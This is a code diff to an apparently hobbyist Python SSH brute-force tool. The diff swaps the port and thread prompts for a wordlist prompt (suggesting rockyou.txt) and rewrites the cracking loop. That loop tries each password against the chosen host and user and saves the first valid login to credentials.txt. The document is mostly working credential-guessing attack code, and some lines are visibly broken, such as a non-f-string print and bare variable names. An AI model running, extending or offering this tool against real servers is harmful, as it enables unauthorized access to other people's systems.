@@ -20,8 +20,7 @@ def brutessh_main():
         try:
             global host_set
             global user_set
-            global port_set
-            global n_threads
+            global wordlist_set
             os.system(clear_screen)
             print(logo)
             print('')
@@ -40,13 +39,9 @@ def brutessh_main():
             print('\tUser Input:')
             print('\tExample: admin')
             print('')
-            # port of FTP, aka 21
-            print('\tPort Input')
-            print('\tExample: 21')
-            print('')
-            # number of threads to spawn
-            print('\tThreads Input')
-            print('\tExample: 10')
+            # wordlist to use
+            print('\tWordlist Input')
+            print('\tExample: /usr/share/wordlists/rockyou.txt')
             print('')
             print('\tZ): Back')
             print('\tX): Exit')
@@ -63,16 +58,10 @@ def brutessh_main():
                     redirect_eagleshell_brute_force()
                 elif user_set == 'x':
                     exit_shell()
-                port_set = input('\u001b[33mPORT \u001b[37m> ').lower()
-                if port_set == 'z':
+                wordlist_set = input('\u001b[33mWORDLIST \u001b[37m> ').lower()
+                if wordlist_set == 'z':
                     redirect_eagleshell_brute_force()
-                elif port_set == 'x':
-                    exit_shell()
-                threads_set = input('\u001b[33mTHREADS \u001b[37m> ').lower()
-                n_threads = threads_set
-                if port_set == 'z':
-                    redirect_eagleshell_brute_force()
-                elif port_set == 'x':
+                elif wordlist_set == 'x':
                     exit_shell()
                 process()
         except KeyboardInterrupt:
@@ -102,21 +91,14 @@ def brutessh_main():
             print("\u001b[32;1m[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{Style.RESET_ALL}")
             return True
 
-    def argurjw():
-        parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
-        parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
-        parser.add_argument("-u", "--user", help="Host username.")
-
-        host
-        passlist
-        user
+    def process():
         # read the file
-        passlist = open(passlist).read().splitlines()
+        wordlist = open(wordlist_set).read().splitlines()
         # brute-force
-        for password in passlist:
-            if is_ssh_open(host, user, password):
+        for password in wordlist:
+            if is_ssh_open(host_set, user_set, password):
                 # if combo is valid, save it to a file
-                open("credentials.txt", "w").write(f"{user}@{host}:{password}")
+                open("credentials.txt", "w").write(f"{user_set}@{host_set}:{password}")
                 break
 
     # The function where you exit
